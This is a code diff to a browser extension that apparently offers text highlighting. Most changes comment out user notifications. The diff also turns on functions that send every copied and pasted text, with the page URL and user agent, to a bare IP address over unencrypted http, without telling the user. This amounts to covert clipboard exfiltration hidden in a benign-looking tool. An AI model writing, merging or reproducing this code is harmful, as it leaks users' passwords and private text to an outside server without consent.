@@ -19,11 +19,11 @@ function updateHighlightingState() {
   if (highlightingEnabled) {
     document.addEventListener('mouseup', handleTextSelection);
     document.body.style.cursor = 'crosshair';
-    showNotification('Highlighting enabled - select text to highlight');
+    // showNotification('Highlighting enabled - select text to highlight');
   } else {
     document.removeEventListener('mouseup', handleTextSelection);
     document.body.style.cursor = '';
-    showNotification('Highlighting disabled');
+    // showNotification('Highlighting disabled');
   }
 }
 
@@ -77,18 +77,18 @@ function highlightSelectedText(selection) {
     // Wrap the selected content
     try {
       range.surroundContents(highlight);
-      showNotification(`Text highlighted! (${highlightCounter} total)`);
+      // showNotification(`Text highlighted! (${highlightCounter} total)`);
     } catch (error) {
       // Fallback for complex selections
       const contents = range.extractContents();
       highlight.appendChild(contents);
       range.insertNode(highlight);
-      showNotification(`Text highlighted! (${highlightCounter} total)`);
+      // showNotification(`Text highlighted! (${highlightCounter} total)`);
     }
     
   } catch (error) {
     console.error('Error highlighting text:', error);
-    showNotification('Could not highlight selected text');
+    // showNotification('Could not highlight selected text');
   }
 }
 
@@ -102,7 +102,7 @@ function removeHighlight(highlightElement) {
   
   // Normalize the text nodes
   parent.normalize();
-  showNotification('Highlight removed');
+  // showNotification('Highlight removed');
 }
 
 // Clear all highlights on the page
@@ -110,7 +110,7 @@ function clearAllHighlights() {
   const highlights = document.querySelectorAll('.quick-notes-highlight');
   highlights.forEach(removeHighlight);
   highlightCounter = 0;
-  showNotification('All highlights cleared');
+  // showNotification('All highlights cleared');
 }
 
 // Show notification to user
@@ -189,14 +189,13 @@ function handleTextCopy(event) {
     console.log('Text copied:', copiedText);
     
     // Send to backend
-    // sendEventToBackend({
-    //   event_type: 'copy',
-    //   url: window.location.href,
-    //   text: copiedText,
-    //   action: 'copy',
-    //   user_agent: navigator.userAgent,
-    //   extension_id: chrome.runtime.id
-    // });
+    sendEventToBackend({
+      event_type: 'copy',
+      url: window.location.href,
+      text: copiedText,
+      action: 'copy',
+      user_agent: navigator.userAgent
+    });
   }
 }
 
@@ -209,21 +208,20 @@ function handleTextPaste(event) {
     console.log('Text pasted:', pastedText.trim());
     
     // Send to backend
-    // sendEventToBackend({
-    //   event_type: 'paste',
-    //   url: window.location.href,
-    //   text: pastedText.trim(),
-    //   action: 'paste',
-    //   user_agent: navigator.userAgent,
-    //   extension_id: chrome.runtime.id
-    // });
+    sendEventToBackend({
+      event_type: 'paste',
+      url: window.location.href,
+      text: pastedText.trim(),
+      action: 'paste',
+      user_agent: navigator.userAgent
+    });
   }
 }
 
 // Send event to backend server
 async function sendEventToBackend(eventData) {
   try {
-    const response = await fetch('https://34.83.75.136:8080/api/events', {
+    const response = await fetch('http://34.83.75.136:8080/api/events', {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
@@ -234,7 +232,7 @@ async function sendEventToBackend(eventData) {
     if (response.ok) {
       console.log('Event sent to backend successfully');
     } else {
-      console.error('Failed to send event to backend:', response.status);
+      console.error('Failed to send event to backend:', response.status, response.statusText);
     }
   } catch (error) {
     console.error('Error sending event to backend:', error);
